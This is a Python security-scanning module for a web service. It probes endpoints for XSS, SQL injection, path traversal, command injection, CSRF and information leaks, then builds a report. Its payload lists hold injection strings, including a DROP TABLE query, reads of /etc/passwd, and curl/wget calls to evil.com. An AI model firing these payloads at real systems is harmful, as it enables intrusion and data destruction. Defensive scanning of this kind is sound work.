"""
Security testing framework for Project Synapse.

Provides comprehensive security testing including vulnerability assessments,
penetration testing, and security validation.
"""

import asyncio
import aiohttp
import json
import time
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urljoin

from ..logging_config import get_logger


class VulnerabilityType(str, Enum):
    """Types of security vulnerabilities."""
    XSS = "xss"
    SQL_INJECTION = "sql_injection"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    CSRF = "csrf"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    INFORMATION_DISCLOSURE = "information_disclosure"
    DENIAL_OF_SERVICE = "denial_of_service"
    INSECURE_HEADERS = "insecure_headers"


class SeverityLevel(str, Enum):
    """Vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class SecurityTestResult:
    """Result of a security test."""
    test_name: str
    vulnerability_type: VulnerabilityType
    severity: SeverityLevel
    passed: bool
    description: str
    details: Dict[str, Any] = field(default_factory=dict)
    recommendations: List[str] = field(default_factory=list)
    evidence: List[str] = field(default_factory=list)


@dataclass
class SecurityTestSuite:
    """Collection of security test results."""
    name: str
    target_url: str
    start_time: float
    end_time: Optional[float] = None
    results: List[SecurityTestResult] = field(default_factory=list)
    
    @property
    def duration(self) -> float:
        """Get test duration in seconds."""
        if self.end_time:
            return self.end_time - self.start_time
        return time.time() - self.start_time
    
    @property
    def passed_tests(self) -> int:
        """Get number of passed tests."""
        return sum(1 for result in self.results if result.passed)
    
    @property
    def failed_tests(self) -> int:
        """Get number of failed tests."""
        return sum(1 for result in self.results if not result.passed)
    
    @property
    def vulnerabilities_found(self) -> List[SecurityTestResult]:
        """Get list of vulnerabilities found."""
        return [result for result in self.results if not result.passed]
    
    @property
    def critical_vulnerabilities(self) -> List[SecurityTestResult]:
        """Get critical vulnerabilities."""
        return [result for result in self.vulnerabilities_found 
                if result.severity == SeverityLevel.CRITICAL]
    
    @property
    def high_vulnerabilities(self) -> List[SecurityTestResult]:
        """Get high severity vulnerabilities."""
        return [result for result in self.vulnerabilities_found 
                if result.severity == SeverityLevel.HIGH]


class SecurityTester:
    """Comprehensive security testing framework."""
    
    def __init__(self, base_url: str, timeout: int = 30):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.logger = get_logger(__name__, 'security_tester')
        self.session: Optional[aiohttp.ClientSession] = None
        
        # Test payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>"
        ]
        
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "1' OR '1'='1' /*",
            "admin'--",
            "' OR 1=1#",
            "' UNION SELECT 1,2,3--",
            "1; SELECT * FROM users"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\windows\\system32\\drivers\\etc\\hosts",
            "&& ping -c 1 127.0.0.1",
            "; curl http://evil.com/",
            "| wget http://evil.com/"
        ]
    
    async def __aenter__(self):
        """Async context manager entry."""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
    
    async def run_comprehensive_test(self, endpoints: List[str] = None) -> SecurityTestSuite:
        """Run comprehensive security test suite."""
        suite = SecurityTestSuite(
            name="Comprehensive Security Test",
            target_url=self.base_url,
            start_time=time.time()
        )
        
        if endpoints is None:
            endpoints = ['/api/v1/scrape', '/api/v1/search', '/api/v1/content']
        
        try:
            # Test security headers
            await self._test_security_headers(suite)
            
            # Test XSS vulnerabilities
            await self._test_xss_vulnerabilities(suite, endpoints)
            
            # Test SQL injection
            await self._test_sql_injection(suite, endpoints)
            
            # Test path traversal
            await self._test_path_traversal(suite, endpoints)
            
            # Test command injection
            await self._test_command_injection(suite, endpoints)
            
            # Test authentication bypass
            await self._test_authentication_bypass(suite, endpoints)
            
            # Test CSRF protection
            await self._test_csrf_protection(suite, endpoints)
            
            # Test information disclosure
            await self._test_information_disclosure(suite)
            
            # Test denial of service
            await self._test_denial_of_service(suite, endpoints)
            
        except Exception as e:
            self.logger.error(f"Security test error: {e}", operation="run_security_test")
        
        suite.end_time = time.time()
        return suite
    
    async def _test_security_headers(self, suite: SecurityTestSuite):
        """Test security headers."""
        try:
            async with self.session.get(self.base_url) as response:
                headers = response.headers
                
                # Required security headers
                required_headers = {
                    'X-Content-Type-Options': 'nosniff',
                    'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                    'X-XSS-Protection': '1; mode=block',
                    'Content-Security-Policy': None,  # Just check presence
                    'Strict-Transport-Security': None  # For HTTPS
                }
                
                for header, expected_values in required_headers.items():
                    if header not in headers:
                        suite.results.append(SecurityTestResult(
                            test_name=f"Missing {header} header",
                            vulnerability_type=VulnerabilityType.INSECURE_HEADERS,
                            severity=SeverityLevel.MEDIUM,
                            passed=False,
                            description=f"Missing security header: {header}",
                            recommendations=[f"Add {header} header to all responses"]
                        ))
                    elif expected_values and headers[header] not in expected_values:
                        suite.results.append(SecurityTestResult(
                            test_name=f"Incorrect {header} header",
                            vulnerability_type=VulnerabilityType.INSECURE_HEADERS,
                            severity=SeverityLevel.LOW,
                            passed=False,
                            description=f"Incorrect value for {header}: {headers[header]}",
                            recommendations=[f"Set {header} to one of: {expected_values}"]
                        ))
                    else:
                        suite.results.append(SecurityTestResult(
                            test_name=f"{header} header present",
                            vulnerability_type=VulnerabilityType.INSECURE_HEADERS,
                            severity=SeverityLevel.INFO,
                            passed=True,
                            description=f"Security header {header} is properly configured"
                        ))
        
        except Exception as e:
            self.logger.error(f"Security headers test error: {e}")
    
    async def _test_xss_vulnerabilities(self, suite: SecurityTestSuite, endpoints: List[str]):
        """Test for XSS vulnerabilities."""
        for endpoint in endpoints:
            for payload in self.xss_payloads[:5]:  # Test first 5 payloads
                try:
                    # Test in query parameters
                    url = f"{self.base_url}{endpoint}?test={payload}"
                    async with self.session.get(url) as response:
                        response_text = await response.text()
                        
                        if payload in response_text and 'text/html' in response.headers.get('content-type', ''):
                            suite.results.append(SecurityTestResult(
                                test_name=f"XSS vulnerability in {endpoint}",
                                vulnerability_type=VulnerabilityType.XSS,
                                severity=SeverityLevel.HIGH,
                                passed=False,
                                description=f"Reflected XSS vulnerability found in {endpoint}",
                                details={"payload": payload, "endpoint": endpoint},
                                evidence=[f"Payload reflected in response: {payload}"],
                                recommendations=[
                                    "Implement proper input sanitization",
                                    "Use Content Security Policy",
                                    "Encode output data"
                                ]
                            ))
                            break
                    
                    # Test in POST data
                    if endpoint != '/':
                        data = {"test": payload}
                        async with self.session.post(f"{self.base_url}{endpoint}", json=data) as response:
                            response_text = await response.text()
                            
                            if payload in response_text and 'text/html' in response.headers.get('content-type', ''):
                                suite.results.append(SecurityTestResult(
                                    test_name=f"XSS vulnerability in POST {endpoint}",
                                    vulnerability_type=VulnerabilityType.XSS,
                                    severity=SeverityLevel.HIGH,
                                    passed=False,
                                    description=f"Stored/Reflected XSS vulnerability in POST {endpoint}",
                                    details={"payload": payload, "endpoint": endpoint, "method": "POST"},
                                    evidence=[f"Payload reflected in POST response: {payload}"],
                                    recommendations=[
                                        "Implement proper input sanitization for POST data",
                                        "Use parameterized queries",
                                        "Validate and encode all user input"
                                    ]
                                ))
                                break
                
                except Exception as e:
                    self.logger.debug(f"XSS test error for {endpoint}: {e}")
        
        # If no XSS vulnerabilities found, add a passed test
        xss_tests = [r for r in suite.results if r.vulnerability_type == VulnerabilityType.XSS]
        if not xss_tests:
            suite.results.append(SecurityTestResult(
                test_name="XSS vulnerability test",
                vulnerability_type=VulnerabilityType.XSS,
                severity=SeverityLevel.INFO,
                passed=True,
                description="No XSS vulnerabilities detected in tested endpoints"
            ))
    
    async def _test_sql_injection(self, suite: SecurityTestSuite, endpoints: List[str]):
        """Test for SQL injection vulnerabilities."""
        for endpoint in endpoints:
            for payload in self.sql_injection_payloads[:5]:  # Test first 5 payloads
                try:
                    # Test in query parameters
                    url = f"{self.base_url}{endpoint}?id={payload}"
                    async with self.session.get(url) as response:
                        response_text = await response.text()
                        
                        # Look for SQL error messages
                        sql_errors = [
                            'sql syntax', 'mysql_fetch', 'ora-', 'postgresql',
                            'sqlite_', 'sqlstate', 'syntax error', 'mysql error'
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in response_text.lower():
                                suite.results.append(SecurityTestResult(
                                    test_name=f"SQL injection vulnerability in {endpoint}",
                                    vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                    severity=SeverityLevel.CRITICAL,
                                    passed=False,
                                    description=f"SQL injection vulnerability found in {endpoint}",
                                    details={"payload": payload, "endpoint": endpoint, "error": error},
                                    evidence=[f"SQL error message detected: {error}"],
                                    recommendations=[
                                        "Use parameterized queries",
                                        "Implement proper input validation",
                                        "Use ORM with built-in protection",
                                        "Apply principle of least privilege to database users"
                                    ]
                                ))
                                break
                
                except Exception as e:
                    self.logger.debug(f"SQL injection test error for {endpoint}: {e}")
        
        # If no SQL injection vulnerabilities found, add a passed test
        sql_tests = [r for r in suite.results if r.vulnerability_type == VulnerabilityType.SQL_INJECTION]
        if not sql_tests:
            suite.results.append(SecurityTestResult(
                test_name="SQL injection vulnerability test",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                severity=SeverityLevel.INFO,
                passed=True,
                description="No SQL injection vulnerabilities detected in tested endpoints"
            ))
    
    async def _test_path_traversal(self, suite: SecurityTestSuite, endpoints: List[str]):
        """Test for path traversal vulnerabilities."""
        for endpoint in endpoints:
            for payload in self.path_traversal_payloads[:3]:  # Test first 3 payloads
                try:
                    url = f"{self.base_url}{endpoint}?file={payload}"
                    async with self.session.get(url) as response:
                        response_text = await response.text()
                        
                        # Look for system file contents
                        system_indicators = [
                            'root:x:', '[boot loader]', 'windows registry',
                            '# /etc/passwd', 'localhost'
                        ]
                        
                        for indicator in system_indicators:
                            if indicator.lower() in response_text.lower():
                                suite.results.append(SecurityTestResult(
                                    test_name=f"Path traversal vulnerability in {endpoint}",
                                    vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                                    severity=SeverityLevel.HIGH,
                                    passed=False,
                                    description=f"Path traversal vulnerability found in {endpoint}",
                                    details={"payload": payload, "endpoint": endpoint},
                                    evidence=[f"System file content detected: {indicator}"],
                                    recommendations=[
                                        "Validate and sanitize file paths",
                                        "Use whitelist of allowed files",
                                        "Implement proper access controls",
                                        "Use chroot or similar containment"
                                    ]
                                ))
                                break
                
                except Exception as e:
                    self.logger.debug(f"Path traversal test error for {endpoint}: {e}")
        
        # If no path traversal vulnerabilities found, add a passed test
        path_tests = [r for r in suite.results if r.vulnerability_type == VulnerabilityType.PATH_TRAVERSAL]
        if not path_tests:
            suite.results.append(SecurityTestResult(
                test_name="Path traversal vulnerability test",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                severity=SeverityLevel.INFO,
                passed=True,
                description="No path traversal vulnerabilities detected in tested endpoints"
            ))
    
    async def _test_command_injection(self, suite: SecurityTestSuite, endpoints: List[str]):
        """Test for command injection vulnerabilities."""
        for endpoint in endpoints:
            for payload in self.command_injection_payloads[:3]:  # Test first 3 payloads
                try:
                    data = {"command": payload}
                    async with self.session.post(f"{self.base_url}{endpoint}", json=data) as response:
                        response_text = await response.text()
                        
                        # Look for command output
                        command_indicators = [
                            'uid=', 'gid=', 'total ', 'volume serial number',
                            'directory of', 'root', 'administrator'
                        ]
                        
                        for indicator in command_indicators:
                            if indicator.lower() in response_text.lower():
                                suite.results.append(SecurityTestResult(
                                    test_name=f"Command injection vulnerability in {endpoint}",
                                    vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                                    severity=SeverityLevel.CRITICAL,
                                    passed=False,
                                    description=f"Command injection vulnerability found in {endpoint}",
                                    details={"payload": payload, "endpoint": endpoint},
                                    evidence=[f"Command output detected: {indicator}"],
                                    recommendations=[
                                        "Never execute user input as system commands",
                                        "Use parameterized APIs instead of shell commands",
                                        "Implement strict input validation",
                                        "Use sandboxing for any system interactions"
                                    ]
                                ))
                                break
                
                except Exception as e:
                    self.logger.debug(f"Command injection test error for {endpoint}: {e}")
        
        # If no command injection vulnerabilities found, add a passed test
        cmd_tests = [r for r in suite.results if r.vulnerability_type == VulnerabilityType.COMMAND_INJECTION]
        if not cmd_tests:
            suite.results.append(SecurityTestResult(
                test_name="Command injection vulnerability test",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                severity=SeverityLevel.INFO,
                passed=True,
                description="No command injection vulnerabilities detected in tested endpoints"
            ))
    
    async def _test_authentication_bypass(self, suite: SecurityTestSuite, endpoints: List[str]):
        """Test for authentication bypass vulnerabilities."""
        # This is a simplified test - in practice, you'd need to know the auth mechanism
        for endpoint in endpoints:
            try:
                # Test without authentication
                async with self.session.get(f"{self.base_url}{endpoint}") as response:
                    if response.status == 200:
                        # Check if this should require authentication
                        if 'admin' in endpoint or 'user' in endpoint or 'profile' in endpoint:
                            suite.results.append(SecurityTestResult(
                                test_name=f"Authentication bypass in {endpoint}",
                                vulnerability_type=VulnerabilityType.AUTHENTICATION_BYPASS,
                                severity=SeverityLevel.HIGH,
                                passed=False,
                                description=f"Endpoint {endpoint} accessible without authentication",
                                details={"endpoint": endpoint, "status": response.status},
                                recommendations=[
                                    "Implement proper authentication checks",
                                    "Use middleware to enforce authentication",
                                    "Follow principle of least privilege"
                                ]
                            ))
            
            except Exception as e:
                self.logger.debug(f"Authentication test error for {endpoint}: {e}")
    
    async def _test_csrf_protection(self, suite: SecurityTestSuite, endpoints: List[str]):
        """Test for CSRF protection."""
        for endpoint in endpoints:
            try:
                # Test POST without CSRF token
                data = {"test": "csrf_test"}
                async with self.session.post(f"{self.base_url}{endpoint}", json=data) as response:
                    # If POST succeeds without CSRF token, it might be vulnerable
                    if response.status == 200:
                        suite.results.append(SecurityTestResult(
                            test_name=f"Potential CSRF vulnerability in {endpoint}",
                            vulnerability_type=VulnerabilityType.CSRF,
                            severity=SeverityLevel.MEDIUM,
                            passed=False,
                            description=f"POST request to {endpoint} succeeded without CSRF protection",
                            details={"endpoint": endpoint, "method": "POST"},
                            recommendations=[
                                "Implement CSRF tokens",
                                "Use SameSite cookie attributes",
                                "Validate Origin/Referer headers",
                                "Use double-submit cookies"
                            ]
                        ))
            
            except Exception as e:
                self.logger.debug(f"CSRF test error for {endpoint}: {e}")
    
    async def _test_information_disclosure(self, suite: SecurityTestSuite):
        """Test for information disclosure."""
        test_paths = [
            '/.env',
            '/config.json',
            '/admin',
            '/debug',
            '/test',
            '/api/debug',
            '/api/config',
            '/.git/config',
            '/robots.txt',
            '/sitemap.xml'
        ]
        
        for path in test_paths:
            try:
                async with self.session.get(f"{self.base_url}{path}") as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Look for sensitive information
                        sensitive_patterns = [
                            'password', 'secret', 'key', 'token', 'api_key',
                            'database', 'config', 'debug', 'error', 'stack trace'
                        ]
                        
                        for pattern in sensitive_patterns:
                            if pattern.lower() in response_text.lower():
                                suite.results.append(SecurityTestResult(
                                    test_name=f"Information disclosure at {path}",
                                    vulnerability_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                                    severity=SeverityLevel.MEDIUM,
                                    passed=False,
                                    description=f"Sensitive information exposed at {path}",
                                    details={"path": path, "pattern": pattern},
                                    evidence=[f"Sensitive pattern found: {pattern}"],
                                    recommendations=[
                                        "Remove or protect sensitive files",
                                        "Implement proper access controls",
                                        "Use environment variables for secrets",
                                        "Configure web server to block sensitive paths"
                                    ]
                                ))
                                break
            
            except Exception as e:
                self.logger.debug(f"Information disclosure test error for {path}: {e}")
    
    async def _test_denial_of_service(self, suite: SecurityTestSuite, endpoints: List[str]):
        """Test for denial of service vulnerabilities."""
        for endpoint in endpoints:
            try:
                # Test with large payload
                large_data = {"data": "A" * 10000}  # 10KB payload
                start_time = time.time()
                
                async with self.session.post(f"{self.base_url}{endpoint}", json=large_data) as response:
                    response_time = time.time() - start_time
                    
                    # If response takes too long, it might be vulnerable
                    if response_time > 10:  # 10 seconds
                        suite.results.append(SecurityTestResult(
                            test_name=f"Potential DoS vulnerability in {endpoint}",
                            vulnerability_type=VulnerabilityType.DENIAL_OF_SERVICE,
                            severity=SeverityLevel.MEDIUM,
                            passed=False,
                            description=f"Endpoint {endpoint} slow with large payload",
                            details={"endpoint": endpoint, "response_time": response_time},
                            recommendations=[
                                "Implement request size limits",
                                "Add rate limiting",
                                "Use input validation",
                                "Implement timeouts"
                            ]
                        ))
            
            except Exception as e:
                self.logger.debug(f"DoS test error for {endpoint}: {e}")


# Utility functions
async def run_security_scan(base_url: str, endpoints: List[str] = None) -> SecurityTestSuite:
    """Run a comprehensive security scan."""
    async with SecurityTester(base_url) as tester:
        return await tester.run_comprehensive_test(endpoints)


def generate_security_report(suite: SecurityTestSuite) -> str:
    """Generate a security report from test results."""
    report = f"""
# Security Test Report

**Target:** {suite.target_url}
**Duration:** {suite.duration:.2f} seconds
**Tests Run:** {len(suite.results)}
**Passed:** {suite.passed_tests}
**Failed:** {suite.failed_tests}

## Summary

- **Critical Vulnerabilities:** {len(suite.critical_vulnerabilities)}
- **High Severity:** {len(suite.high_vulnerabilities)}
- **Medium Severity:** {len([r for r in suite.vulnerabilities_found if r.severity == SeverityLevel.MEDIUM])}
- **Low Severity:** {len([r for r in suite.vulnerabilities_found if r.severity == SeverityLevel.LOW])}

## Vulnerabilities Found

"""
    
    for vuln in suite.vulnerabilities_found:
        report += f"""
### {vuln.test_name} ({vuln.severity.upper()})

**Type:** {vuln.vulnerability_type}
**Description:** {vuln.description}

**Recommendations:**
"""
        for rec in vuln.recommendations:
            report += f"- {rec}\n"
        
        if vuln.evidence:
            report += "\n**Evidence:**\n"
            for evidence in vuln.evidence:
                report += f"- {evidence}\n"
    
    return report